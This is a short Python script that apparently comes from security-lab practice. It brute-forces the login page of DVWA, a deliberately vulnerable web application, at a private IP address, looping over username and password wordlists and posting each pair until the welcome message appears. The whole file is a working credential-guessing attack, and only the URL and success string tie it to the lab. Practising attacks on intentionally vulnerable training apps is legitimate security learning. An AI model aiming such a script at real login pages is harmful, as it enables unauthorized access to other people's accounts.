import requests

url = "http://192.168.21.129/DVWA/login.php"
userlist = open("usernames.txt","r")
passlist = open("passwords.txt","r")

def send_request():

    user_list = userlist.read().strip().split("\n")
    pass_list = passlist.read().strip().split("\n")
    
    csrf_token=""
    
    for line in user_list:
        for line1 in pass_list:
            data = {"username":line.strip(),"password":line1.strip(),"user_token":csrf_token,"Login":"Login"}
            req = requests.post(url, data=data)
            if 'Welcome to Damn Vulnerable Web Application!' in req.text:
                print(f"Login is a success. Username: {line.strip()} & Password: {line1.strip()}")
            else:
                print(f"No response. Username: {line.strip()} & Password: {line1.strip()}")
    
send_request()
